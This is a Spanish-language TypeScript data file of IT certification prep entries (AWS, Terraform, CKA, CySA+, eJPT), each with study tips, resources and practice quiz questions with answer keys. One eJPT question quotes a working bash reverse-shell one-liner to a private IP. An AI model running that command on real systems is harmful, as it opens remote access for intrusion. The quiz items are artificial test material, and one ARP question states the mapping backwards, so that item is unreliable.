          "Un IAM Role da credenciales temporales y rotadas a la instancia, sin claves hardcodeadas. Nunca se ponen claves en el código ni en el repo.",
      },
      {
        q: "Una base de datos de comercio electrónico experimenta una gran cantidad de consultas de lectura repetitivas, lo que ralentiza el rendimiento general. ¿Qué solución arquitectónica reduce la carga de la base de datos?",
        options: [
          "Habilitar Multi-AZ en RDS",
          "Implementar una capa de almacenamiento en caché con Amazon ElastiCache",
          "Escalar verticalmente la instancia de RDS",
        ],
        answer: 1,
        explain:
          "ElastiCache almacena en memoria los datos consultados con frecuencia, evitando que las lecturas repetitivas lleguen a la base de datos relacional RDS."
      },
      {
        q: "Tenés archivos confidenciales almacenados en S3 que no deben ser eliminados ni modificados por ningún usuario, incluido el administrador, durante un período de cumplimiento regulatorio de 3 años. ¿Qué característica de S3 usás?",
        options: ["S3 Versioning", "S3 Object Lock en modo Compliance", "S3 Lifecycle Policies"],
        answer: 1,
        explain:
          "S3 Object Lock en modo Compliance impide de forma estricta que cualquier usuario (incluso el usuario root) elimine o altere un objeto durante el periodo de retención."
      },
      {
        q: "¿Qué tipo de volumen Amazon EBS es el más adecuado y de menor costo para cargas de trabajo secuenciales grandes y almacenamiento de logs de acceso poco frecuente?",
        options: ["Provisioned IOPS SSD (io2)", "Throughput Optimized HDD (st1) / Cold HDD (sc1)", "General Purpose SSD (gp3)"],
        answer: 1,
        explain:
          "Los volúmenes HDD (st1 o sc1) son los más rentables para cargas de trabajo de alto rendimiento secuenciales y acceso poco frecuente, a diferencia de los SSD optimizados para IOPS aleatorios."
      },
      {
        q: "• ¿Qué componente de AWS te permite interconectar VPCs de manera centralizada sin necesidad de crear conexiones peering full-mesh complejas?",
        options: ["VPC Endpoint", "AWS Transit Gateway", "NAT Gateway"],
        answer: 1,
        explain:
          "AWS Transit Gateway funciona como un router en la nube centralizado, simplificando enormemente la interconexión a escala de múltiples VPCs y redes locales."
      }
    ],
  },
  {
    slug: "hashicorp-terraform-associate",
    name: "HashiCorp Certified: Terraform Associate",
    code: "Terraform Associate",
    vendor: "HashiCorp",
    badge: "TF",
    level: "Asociado",
    icon: "cloud",
    accent: "#844FBA",
    summary:
      "Valida los conocimientos fundamentales de infraestructura como código (IaC) con Terraform. Ideal para desarrolladores, DevOps e ingenieros de nube.",
    prepTips: [
      "Dominá la diferencia entre terraform plan (previsualización de cambios) y terraform apply (aplicación real).",
      "Entendé por qué el archivo terraform.tfstate es crítico y por qué nunca debe subirse a Git (puede contener secretos y credenciales).",
      "Estudiá el uso de variables locales (locals), variables de entrada (variables) y variables de salida (outputs)."
    ],
    studyResources: [
      {
        name: "HashiCorp Terraform Associate Certification Course",
        platform: "freeCodeCamp / Andrew Brown",
        type: "video",
        url: "https://www.youtube.com/watch?v=V4wkCXgSCdw",
        free: true,
        desc: "Un excelente video curso completo de 12 horas con laboratorios paso a paso y preparación teórica."
      },
      {
        name: "Official Terraform Associate Tutorials",
        platform: "HashiCorp Developer",
        type: "guide",
        url: "https://developer.hashicorp.com/terraform/tutorials/certification-associate-tutorials",
        free: true,
        desc: "La ruta de aprendizaje oficial que agrupa los tutoriales prácticos recomendados para rendir."
      }
    ],
    domainLabs: [
      {
        domainName: "Entender infraestructura como código (IaC)",
        labIds: ["cloud-produccion/aws-desde-cero"]
      },
      {
        domainName: "Navegar por el flujo de trabajo de Terraform",
        labIds: ["cloud-produccion/vpc-security-groups"]
      },
      {
        domainName: "Interactuar con módulos de Terraform",
        labIds: ["cloud-produccion/blast-radius-costo"]
      }
    ],
    meta: {
      questions: 57,
      durationMin: 57,
      passingScore: "70%",
      cost: "USD 70",
      validityYears: 2,
      format: "Opción múltiple, opción de respuesta múltiple, verdadero/falso, completar el espacio en blanco",
    },
    outcomes: [
      "Escribir configuraciones de Terraform reutilizables usando HCL.",
      "Administrar el estado de Terraform (tfstate) de manera segura y remota.",
      "Crear y consumir módulos para estructurar arquitecturas organizadas.",
      "Entender y ejecutar el ciclo de vida básico de Terraform (init, plan, apply, destroy)."
    ],
    domains: [
      { name: "Entender infraestructura como código (IaC)", weight: 10 },
      { name: "Conceptos básicos de Terraform", weight: 15 },
      { name: "Usar el CLI de Terraform", weight: 25 },
      { name: "Interactuar con módulos de Terraform", weight: 15 },
      { name: "Navegar por el flujo de trabajo de Terraform", weight: 20 },
      { name: "Administrar estado y Terraform Cloud", weight: 15 },
    ],
    relatedPaths: ["cloud-produccion", "devsecops-agentes"],
    exam: [
      {
        q: "¿Qué comando inicializa el directorio de trabajo que contiene los archivos de configuración de Terraform?",
        options: ["terraform plan", "terraform init", "terraform apply"],
        answer: 1,
        explain:
          "terraform init descarga los proveedores necesarios, inicializa los módulos y configura el backend de almacenamiento del estado."
      },
      {
        q: "Verdadero o falso: El archivo de estado terraform.tfstate debe subirse al repositorio Git de tu aplicación.",
        options: ["Verdadero", "Falso"],
        answer: 1,
        explain:
          "Falso. El archivo .tfstate puede contener secretos en texto plano (como tokens o contraseñas). Debe almacenarse en un backend remoto seguro (S3, Terraform Cloud) con cifrado."
      },
      {
        q: "¿Cuál es el propósito principal de usar 'terraform plan'?",
        options: [
          "Aplicar cambios a la nube directamente",
          "Crear una previsualización de las acciones que Terraform tomará para alcanzar el estado deseado",
          "Eliminar todos los recursos administrados",
        ],
        answer: 1,
        explain:
          "terraform plan compara el estado actual con la configuración deseada y describe el plan de acción (crear, modificar o destruir) sin realizar cambios reales."
      },
      {
        q: "En HCL, ¿cómo se define una variable cuyo valor no puede ser cambiado externamente pero sirve para reutilizar valores dentro del propio módulo?",
        options: ["variable", "output", "locals"],
        answer: 2,
        explain:
          "Las variables locales (locals) actúan como constantes internas de un módulo y no pueden ser configuradas desde fuera, a diferencia de las variables estándar."
      },
      {
        q: "Al usar Terraform en equipo, ¿qué funcionalidad evita que dos desarrolladores apliquen cambios sobre la misma infraestructura al mismo tiempo?",
        options: ["State Locking (bloqueo de estado)", "Git branching", "Workspace separation"],
        answer: 0,
        explain:
          "State Locking impide escrituras simultáneas en el estado, evitando inconsistencias o corrupción del archivo tfstate durante la aplicación de cambios."
      },
      {
        q: "¿Qué comando destruye de manera segura toda la infraestructura administrada por la configuración de Terraform?",
        options: ["terraform delete", "terraform destroy", "terraform remove"],
        answer: 1,
        explain:
          "terraform destroy lee el estado y remueve todos los recursos declarados bajo esa configuración."
      },
      {
        q: "¿Qué tipo de bloque en HCL se utiliza para consultar información sobre recursos que ya existen en la nube y no son administrados directamente por Terraform?",
        options: ["resource", "variable", "data"],
        answer: 2,
        explain:
          "Los bloques 'data' (Data Sources) permiten leer información externa de APIs de nube (como buscar el ID de una AMI reciente en AWS) para usarla en la configuración."
      },
      {
        q: "¿Cómo se referencia una variable llamada 'db_port' dentro de una cadena de texto en HCL (interpolación)?",
        options: ["${var.db_port}", "$var.db_port", "var.db_port"],
        answer: 0,
        explain:
          "HCL utiliza la sintaxis ${...} para interpolar variables u operaciones dentro de cadenas de texto de tipo string."
      },
      {
        q: "Verdadero o falso: Terraform requiere conectarse constantemente a internet para validar el estado de tus recursos una vez desplegados.",
        options: ["Verdadero", "Falso"],
        answer: 1,
        explain:
          "Falso. Terraform lee el archivo de estado local o del backend remoto para comparar los recursos sin consultar continuamente la API en segundo plano."
      },
      {
        q: "¿Qué backend remoto de HashiCorp proporciona interfaz web, almacenamiento de estado seguro, control de accesos e integración de VCS gratuita?",
        options: ["Amazon S3", "Terraform Cloud", "HashiCorp Consul"],
        answer: 1,
        explain:
          "Terraform Cloud es la plataforma administrada de HashiCorp que hospeda el estado, bloquea las ejecuciones e integra flujos de trabajo VCS de manera centralizada."
      }
    ],
  },
  {
    slug: "certified-kubernetes-administrator",
    name: "Certified Kubernetes Administrator (CKA)",
    code: "CKA",
    vendor: "The Linux Foundation",
    badge: "CKA",
    level: "Asociado",
    icon: "server",
    accent: "#326CE5",
    summary:
      "La certificación práctica de Kubernetes más respetada. Valida tu habilidad para configurar y administrar clusters de Kubernetes en producción.",
    prepTips: [
      "Practicá atajos con kubectl alias (alias k=kubectl) y generá YAML rápidamente con --dry-run=client -o yaml.",
      "Entendé el funcionamiento de los componentes del plano de control (Control Plane): API Server, etcd, Scheduler y Controller Manager.",
      "Dominá el troubleshooting de nodos caídos y la configuración de redes de Pods (CNI)."
    ],
    studyResources: [
      {
        name: "Kubernetes Official Documentation",
        platform: "Kubernetes.io",
        type: "doc",
        url: "https://kubernetes.io/docs/home/",
        free: true,
        desc: "La documentación oficial de Kubernetes que podés (y debés) consultar durante el examen real."
      },
      {
        name: "Free CKA Course on YouTube",
        platform: "freeCodeCamp / KodeKloud",
        type: "video",
        url: "https://www.youtube.com/watch?v=X48VuDVv0do",
        free: true,
        desc: "Curso completo de video de 5 horas que repasa los temas fundamentales necesarios para la prueba."
      }
    ],
    domainLabs: [
      {
        domainName: "Cluster Architecture, Installation & Config",
        labIds: ["linux-real/systemd-y-journalctl"]
      },
      {
        domainName: "Services & Networking",
        labIds: ["redes-internet/dns-paso-a-paso"]
      },
      {
        domainName: "Troubleshooting",
        labIds: ["ciberseguridad/docker-socket-to-host"]
      }
    ],
    meta: {
      questions: 17,
      durationMin: 120,
      passingScore: "66%",
      cost: "USD 395",
      validityYears: 3,
      format: "Laboratorio práctico basado en desempeño (100% interactivo)",
    },
    outcomes: [
      "Instalar y configurar clusters de Kubernetes usando kubeadm.",
      "Gestionar almacenamiento persistente (PV, PVC, StorageClasses).",
      "Configurar redes de pods, balanceadores e ingress controllers.",
      "Diagnosticar y solucionar fallos en pods, servicios e infraestructura."
    ],
    domains: [
      { name: "Almacenamiento (Storage)", weight: 10 },
      { name: "Troubleshooting", weight: 30 },
      { name: "Workloads & Scheduling", weight: 15 },
      { name: "Cluster Architecture, Installation & Config", weight: 25 },
      { name: "Services & Networking", weight: 20 }
    ],
    relatedPaths: ["linux-real", "cloud-produccion", "devsecops-agentes"],
    exam: [
      {
        q: "¿Qué componente de Kubernetes se encarga de asignar pods a nodos específicos según los recursos disponibles?",
        options: ["Kubelet", "Kube-Scheduler", "Kube-Controller-Manager"],
        answer: 1,
        explain:
          "Kube-Scheduler analiza los requisitos de un pod y los recursos de los nodos para asignarlo al host ideal."
      },
      {
        q: "¿Qué comando kubectl muestra los logs en tiempo real de un pod llamado 'web-server'?",
        options: ["kubectl describe pod web-server", "kubectl logs -f web-server", "kubectl get logs web-server"],
        answer: 1,
        explain:
          "El comando `kubectl logs -f pod-name` sigue (-f, follow) los logs del contenedor dentro del pod en vivo."
      },
      {
        q: "¿Qué tipo de recurso en Kubernetes proporciona almacenamiento persistente independiente del ciclo de vida de un pod individual?",
        options: ["EmptyDir", "PersistentVolume (PV)", "ConfigMap"],
        answer: 1,
        explain:
          "Un PersistentVolume (PV) es un recurso de almacenamiento aprovisionado por un administrador que persiste más allá de la vida de cualquier pod individual."
      },
      {
        q: "¿Qué comando rápido genera el YAML de un pod sin crearlo realmente en el cluster (dry-run)?",
        options: [
          "kubectl run web --image=nginx --dry-run=client -o yaml",
          "kubectl create pod web --image=nginx --template=yaml",
          "kubectl run web --image=nginx --export",
        ],
        answer: 0,
        explain:
          "La combinación `--dry-run=client -o yaml` evalúa la sintaxis del comando localmente y exporta el YAML correspondiente para guardarlo o modificarlo."
      },
      {
        q: "¿Qué agente de Kubernetes corre en cada nodo y se encarga de que los contenedores estén funcionando según lo solicitado?",
        options: ["Kube-Proxy", "Etcd", "Kubelet"],
        answer: 2,
        explain:
          "El Kubelet es el agente del nodo que se comunica con el API Server y se encarga de ejecutar y monitorear los contenedores locales."
      },
      {
        q: "Verdadero o falso: etcd es la base de datos clave-valor distribuida y consistente que sirve como la única fuente de verdad de Kubernetes.",
        options: ["Verdadero", "Falso"],
        answer: 0,
        explain:
          "Verdadero. etcd guarda todo el estado de configuración del cluster y debe ser respaldada frecuentemente en producción."
      },
      {
        q: "¿Qué tipo de Service expone una aplicación de manera externa asignando una IP estática pública provista por el proveedor de nube?",
        options: ["ClusterIP", "NodePort", "LoadBalancer"],
        answer: 2,
        explain:
          "LoadBalancer crea un balanceador de carga externo en el proveedor de nube y mapea el tráfico hacia los pods de tu servicio."
      },
      {
        q: "Necesitás configurar un Pod para que pueda escribir en el directorio root del host. ¿Qué volumen utilizás?",
        options: ["hostPath", "persistentVolumeClaim", "secret"],
        answer: 0,
        explain:
          "hostPath monta un directorio directo del sistema operativo del nodo dentro del pod. Debe usarse con precaución por razones de seguridad."
      },
      {
        q: "¿Qué recurso se encarga de enrutar tráfico HTTP y HTTPS externo hacia los servicios internos del cluster basándose en reglas de rutas?",
        options: ["Ingress", "NetworkPolicy", "ClusterIP"],
        answer: 0,
        explain:
          "Ingress actúa como un reverse proxy/router en el perímetro del cluster, aplicando reglas de host y path antes de enviar el tráfico a los Services."
      },
      {
        q: "Si un Pod está atascado en estado 'ImagePullBackOff', ¿cuál es la causa más probable?",
        options: [
          "El pod no tiene recursos de CPU disponibles",
          "La imagen del contenedor no existe o el cluster no tiene permisos para descargarla",
          "El servicio de red del nodo está caído",
        ],
        answer: 1,
        explain:
          "ImagePullBackOff significa que kubelet falló repetidamente al descargar la imagen especificada en el manifiesto (url incorrecta, tag erróneo o credenciales de registro faltantes)."
      }
    ],
  },
  {
    slug: "comptia-cysa-plus",
    name: "CompTIA CySA+ (Cybersecurity Analyst)",
    code: "CS0-003",
    vendor: "CompTIA",
    badge: "Cy+",
    badgeImage: "/certifications/comptia-cysa-plus.png",
    level: "Asociado",
    icon: "shield",
    accent: "#c80f2e",
    summary:
      "Certificación intermedia enfocada en defensa cibernética. Valida habilidades en análisis de logs, detección de intrusos y respuesta ante incidentes.",
    prepTips: [
      "Estudiá la lectura e interpretación de logs de red (Wireshark, tcpdump) y de sistemas (journalctl, syslog).",
      "Aprendé la sintaxis de expresiones regulares (RegEx) para buscar indicadores de compromiso (IoC) en logs.",
      "Dominá el ciclo de vida de respuesta ante incidentes del NIST: Preparación, Detección, Contención, Erradicación y Lecciones Aprendidas."
    ],
    studyResources: [
      {
        name: "CySA+ CS0-003 Exam Objectives Guide",
        platform: "CompTIA",
        type: "guide",
        url: "https://www.comptia.jp/pdf/CompTIA%20CySA+%20CS0-003%20Exam%20Objectives.pdf",
        free: true,
        desc: "El temario y lista de acrónimos oficial de CompTIA para el examen de Analista de Seguridad."
      },
      {
        name: "CySA+ Full Certification Prep playlist",
        platform: "YouTube / Certify Breakfast",
        type: "video",
        url: "https://www.youtube.com/playlist?list=PLMOMg0C_Tz9T_8s36P_Uj35jT_l6_gC_d",
        free: true,
        desc: "Curso completo gratuito de CySA+ que repasa los dominios teóricos y herramientas analíticas."
      }
    ],
    domainLabs: [
      {
        domainName: "Gestión de vulnerabilidades",
        labIds: ["ciberseguridad/threat-modeling-app-chica"]
      },
      {
        domainName: "Monitoreo de seguridad",
        labIds: ["linux-real/systemd-y-journalctl"]
      },
      {
        domainName: "Respuesta a incidentes",
        labIds: ["cloud-produccion/cloudtrail-quien-hizo-que"]
      }
    ],
    meta: {
      questions: 85,
      durationMin: 165,
      passingScore: "750/900",
      cost: "USD 392",
      validityYears: 3,
      format: "Opción múltiple + preguntas basadas en desempeño (PBQ)",
    },
    outcomes: [
      "Analizar logs de sistemas, firewalls y aplicaciones para detectar anomalías.",
      "Identificar y evaluar vulnerabilidades técnicas en infraestructura.",
      "Ejecutar tareas de contención ante incidentes y análisis de IoCs.",
      "Configurar herramientas de monitoreo (SIEM, EDR, IDS/IPS)."
    ],
    domains: [
      { name: "Gestión de vulnerabilidades", weight: 22 },
      { name: "Monitoreo de seguridad", weight: 25 },
      { name: "Respuesta a incidentes", weight: 23 },
      { name: "Arquitectura de seguridad y herramientas", weight: 18 },
      { name: "Cumplimiento y gobernanza", weight: 12 }
    ],
    relatedPaths: ["ciberseguridad", "linux-real", "cloud-produccion"],
    exam: [
      {
        q: "Encontrás multiples accesos fallidos de SSH seguidos por una conexión exitosa desde una IP desconocida. ¿Qué ataque sospechás?",
        options: ["DDoS", "Fuerza bruta con contraseña adivinada", "SQL Injection"],
        answer: 1,
        explain:
          "Múltiples accesos fallidos rápidos indican ataques de fuerza bruta o diccionario orientados a adivinar contraseñas."
      },
      {
        q: "¿Cuál es el primer paso en el ciclo de vida de respuesta a incidentes de NIST?",
        options: ["Detección y análisis", "Preparación", "Contención, erradicación y recuperación"],
        answer: 1,
        explain:
          "La preparación es el primer paso, donde se establecen políticas, herramientas y se entrena al equipo antes de que ocurra un incidente."
      },
      {
        q: "Un analista busca archivos de configuración sospechosos usando la regla: '^.*\\.conf$'. ¿Qué herramienta y concepto está aplicando?",
        options: ["Nmap / Escaneo de puertos", "Grep / Expresiones Regulares", "Traceroute / Routing"],
        answer: 1,
        explain:
          "Grep utiliza expresiones regulares (RegEx) para buscar patrones específicos en cadenas de texto o logs."
      },
      {
        q: "¿Qué métrica del estándar CVSS evalúa el impacto en la confidencialidad, integridad y disponibilidad si se explota con éxito una vulnerabilidad?",
        options: [
          "Métrica de Exploitability",
          "Métrica de Impacto",
          "Métrica Temporal",
        ],
        answer: 1,
        explain:
          "Las métricas de impacto de CVSS analizan la degradación potencial sobre la tríada CIA (Confidencialidad, Integridad y Disponibilidad) resultante de un exploit."
      },
      {
        q: "¿Qué herramienta recopila, correlaciona y analiza de manera centralizada logs de múltiples fuentes de infraestructura en tiempo real?",
        options: ["SIEM", "Nmap", "Wireshark"],
        answer: 0,
        explain:
          "Un SIEM (Security Information and Event Management) consolida datos de logs, detecta patrones maliciosos cruzando fuentes y genera alertas centralizadas."
      },
      {
        q: "Verificás que un servidor comprometido sigue enviando balizas de conexión (beacons) periódicas a una IP externa. ¿Qué tipo de infraestructura está operando?",
        options: ["DNS Server legítimo", "Command & Control (C2) de un atacante", "Proxy reverso local"],
        answer: 1,
        explain:
          "El 'beaconing' es el tráfico saliente periódico que envía un host infectado hacia el servidor C2 de un atacante para recibir instrucciones."
      },
      {
        q: "¿Qué control técnico limita de forma inmediata el movimiento lateral de un atacante aislando redes comprometidas?",
        options: ["Políticas de privacidad", "Microsegmentación de red", "Monitoreo de logs"],
        answer: 1,
        explain:
          "La microsegmentación divide la red en segmentos pequeños lógicos y bloquea tráficos no autorizados entre ellos, minimizando el radio de impacto (blast radius) de una brecha."
      },
      {
        q: "¿Qué tipo de escaneo no intrusivo evalúa puertos abiertos e identifica servicios sin explotar activamente la vulnerabilidad?",
        options: ["Escaneo de vulnerabilidades", "Penetration Testing activo", "Fuzzing de API"],
        answer: 0,
        explain:
          "El escaneo de vulnerabilidades busca fallos conocidos de manera pasiva y no destructiva, a diferencia de un pentest que intenta la explotación real."
      },
      {
        q: "¿Qué estándar o catálogo documenta las tácticas, técnicas y procedimientos comunes de los atacantes (TTPs) para auditar defensas?",
        options: ["ISO 27001", "MITRE ATT&CK", "NIST CSF"],
        answer: 1,
        explain:
          "MITRE ATT&CK es una base de conocimientos global estructurada de comportamientos de adversarios en ataques reales en el mundo real."
      },
      {
        q: "Si necesitás aislar un servidor vulnerado de la red sin apagarlo para no perder evidencia en memoria RAM, ¿qué acción de contención tomás?",
        options: [
          "Apagar el tomacorriente del servidor",
          "Aislar la máquina virtual a una VLAN muerta (Sandboxed VLAN)",
          "Formatear el disco duro",
        ],
        answer: 1,
        explain:
          "Mover el servidor a una VLAN aislada bloquea el tráfico sospechoso (contención) sin alterar los datos volátiles en memoria RAM que se perderían al apagarla."
      }
    ],
  },
  {
    slug: "elearnsecurity-junior-penetration-tester",
    name: "eLearnSecurity Junior Penetration Tester (eJPT)",
    code: "eJPTv2",
    vendor: "INE",
    badge: "eJPT",
    level: "Fundamental",
    icon: "terminal",
    accent: "#0d6efd",
    summary:
      "Una certificación de seguridad ofensiva 100% práctica. Te evalúa hackeando una red real para responder preguntas de auditoría técnica.",
    prepTips: [
      "Aprendé a usar Nmap de manera eficiente (velocidades, tipos de escaneo) para descubrir servicios y puertos.",
      "Dominá el uso básico de Metasploit, pero entendé la explotación manual de fallos web como SQLi e IDOR.",
      "Familiarizate con el enrutamiento de red (pivoting) en entornos multi-red durante la fase de post-explotación."
    ],
    studyResources: [
      {
        name: "Penetration Testing Student (PTS) Path",
        platform: "INE",
        type: "course",
        url: "https://ine.com/learning-paths/ejpt",
        free: false,
        desc: "La ruta de entrenamiento oficial y detallada diseñada por INE para aprobar el examen práctico."
      },
      {
        name: "Free Ethical Hacking Course",
        platform: "freeCodeCamp / YouTube",
        type: "video",
        url: "https://www.youtube.com/watch?v=3Kq1MIfTWCE",
        free: true,
        desc: "Curso completo introductorio de pentesting de 15 horas que repasa redes, scripts y ataques prácticos."
      }
    ],
    domainLabs: [
      {
        domainName: "Ataques a aplicaciones web",
        labIds: ["ciberseguridad/sql-injection-parametrizada", "ciberseguridad/idor-cambiar-un-id", "ciberseguridad/xss-local-defensivo"]
      },
      {
        domainName: "Ataques a redes e infra",
        labIds: ["ciberseguridad/docker-socket-to-host", "ciberseguridad/por-que-chmod-777"]
      },
      {
        domainName: "Reconocimiento e información",
        labIds: ["redes-internet/dns-paso-a-paso"]
      }
    ],
    meta: {
      questions: 35,
      durationMin: 240,
      passingScore: "70%",
      cost: "USD 250",
      validityYears: 3,
      format: "Examen práctico en laboratorio interactivo real (35 preguntas basadas en hallazgos)",
    },
    outcomes: [
      "Realizar escaneos de red activos y pasivos de manera segura.",
      "Identificar y explotar vulnerabilidades web clásicas (OWASP Top 10).",
      "Ejecutar exploits públicos y comprender su funcionamiento interno.",
      "Realizar ataques de red básicos (ARP spoofing, cracking de contraseñas)."
    ],
    domains: [
      { name: "Metodología y evaluación", weight: 25 },
      { name: "Reconocimiento e información", weight: 25 },
      { name: "Ataques a redes e infra", weight: 25 },
      { name: "Ataques a aplicaciones web", weight: 25 }
    ],
    relatedPaths: ["ciberseguridad", "redes-internet", "linux-real"],
    exam: [
      {
        q: "¿Qué parámetro de Nmap realiza un escaneo de tipo TCP SYN (half-open) rápido y sigiloso?",
        options: ["-sT", "-sS", "-sU"],
        answer: 1,
        explain:
          "El flag `-sS` inicia un escaneo SYN (half-open) que no completa el handshake TCP de 3 pasos, reduciendo la probabilidad de ser detectado por logs del host."
      },
      {
        q: "Encontrás un campo de entrada web vulnerable a XSS que ejecuta código JavaScript en el navegador de cualquier usuario que visite la página. ¿Qué tipo de XSS es?",
        options: ["XSS Reflejado", "XSS Almacenado (Stored)", "DOM-based XSS"],
        answer: 1,
        explain:
          "Si el código dañino se guarda en la base de datos y se muestra a múltiples usuarios persistiendo en la página, es un XSS Almacenado."
      },
      {
        q: "¿Qué protocolo de red traduce direcciones MAC a direcciones IP locales?",
        options: ["DNS", "DHCP", "ARP"],
        answer: 2,
        explain:
          "El protocolo ARP (Address Resolution Protocol) mapea direcciones IP de la capa de red a direcciones físicas MAC de la capa de enlace."
      },
      {
        q: "¿Cuál es el propósito principal de la fase de 'Reconocimiento' en un test de penetración?",
        options: [
          "Explotar vulnerabilidades críticas en el servidor",
          "Recopilar tanta información pública y técnica del objetivo como sea posible",
          "Borrar los logs de acceso del sistema comprometido",
        ],
        answer: 1,
        explain:
          "El reconocimiento (footprinting) recopila información activa y pasiva del objetivo para planificar los ataques posteriores y mapear la superficie expuesta."
      },
      {
        q: "Si lográs explotar un comando de consola vulnerable e inyectás '/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1' para que el servidor se conecte a tu oyente local. ¿Qué creaste?",
        options: ["Bind Shell", "Reverse Shell (conexión reversa)", "Port Forwarding"],
        answer: 1,
        explain:
          "Una reverse shell hace que el host víctima inicie la conexión hacia la máquina del atacante, lo que usualmente evade las reglas de firewall entrantes."
      },
      {
        q: "¿Qué herramienta es el framework estándar de explotación ofensiva utilizado para buscar exploits, payloads y módulos de escaneo?",
        options: ["Wireshark", "Metasploit Framework (msfconsole)", "John the Ripper"],
        answer: 1,
        explain:
          "Metasploit contiene miles de exploits públicos empaquetados listos para testing y validación de seguridad."
      },
      {
        q: "Al escanear un puerto web, encontrás que el servidor devuelve el header: 'Server: Apache/2.4.41'. ¿Cómo se llama esta fase?",
        options: ["Brute forcing", "Banner Grabbing (captura de banner)", "Privilege Escalation"],
        answer: 1,
        explain:
          "Banner Grabbing lee los encabezados o respuestas del puerto para identificar la versión exacta del servicio y software corriendo."
      },
      {
        q: "¿Qué técnica de inyección permite ejecutar consultas SQL no autorizadas en la base de datos a través de campos de entrada mal saneados?",
        options: ["Cross-Site Scripting (XSS)", "SQL Injection (SQLi)", "Command Injection"],
        answer: 1,
        explain:
          "SQLi ocurre cuando datos provistos por el usuario se concatenan directamente en sentencias SQL, permitiendo alterar la lógica de la base de datos."
      },
      {
        q: "Si querés descifrar hashes de contraseñas guardados en un archivo de texto de manera local y rápida usando un diccionario de palabras. ¿Qué herramienta usás?",
        options: ["Nmap", "John the Ripper (o Hashcat)", "Hydra"],
        answer: 1,
        explain:
          "John the Ripper y Hashcat son craqueadores de contraseñas offline muy veloces que comparan hashes de diccionarios con el objetivo."
      },
      {
        q: "¿Qué puerto expone por defecto el protocolo SMB (Server Message Block) utilizado para compartir archivos en entornos Windows?",
        options: [
          "22",
          "445",
          "80",
        ],
        answer: 1,
        explain:
          "SMB corre comúnmente sobre el puerto TCP 445 en sistemas modernos para compartir archivos e impresoras."
      }
    ],
  },
];

export function getCertification(slug: string): Certification | undefined {
  return certifications.find((c) => c.slug === slug);
}
